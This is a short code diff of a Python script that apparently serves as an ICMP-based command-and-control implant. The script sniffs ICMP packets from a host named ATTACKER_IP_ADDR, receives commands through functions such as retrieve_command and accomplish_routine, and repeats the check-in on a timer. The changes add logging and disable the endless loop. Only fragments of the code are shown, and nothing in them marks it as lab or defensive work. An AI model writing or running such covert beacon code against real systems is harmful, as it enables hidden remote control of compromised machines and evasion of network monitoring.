@@ -70,8 +70,9 @@ def retrieve_command(response):
 
 
 def receive_response_packet(timeout, nb_responses):
-    packet = scapy.sniff(filter=f"host {ATTACKER_IP_ADDR} and icmp", count=nb_responses, timeout=timeout)
-    print("Receiving packet:", packet.show())
+    print("Start Receiving packet")
+    packet = scapy.sniff(filter=f"icmp and host {ATTACKER_IP_ADDR}", count=nb_responses, timeout=timeout)
+    print("End Receiving packet:", packet.show())
     return packet
 
 
@@ -139,14 +140,14 @@ def forge_random_command():
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    while True:
+    #while True:
         #try:
-        if can_proceed(ATTACKER_IP_ADDR):
-            accomplish_routine(ATTACKER_IP_ADDR)
+    if can_proceed(ATTACKER_IP_ADDR):
+        accomplish_routine(ATTACKER_IP_ADDR)
                 #except Exception as err:
             #print(f"Unexpected {err=}, {type(err)=}")
             #else:
         #    print("Nothing went wrong!")
         #finally:
         #    print(f"See you in {FREQUENCY} min(s)")
-        time.sleep(FREQUENCY)
+    time.sleep(FREQUENCY)
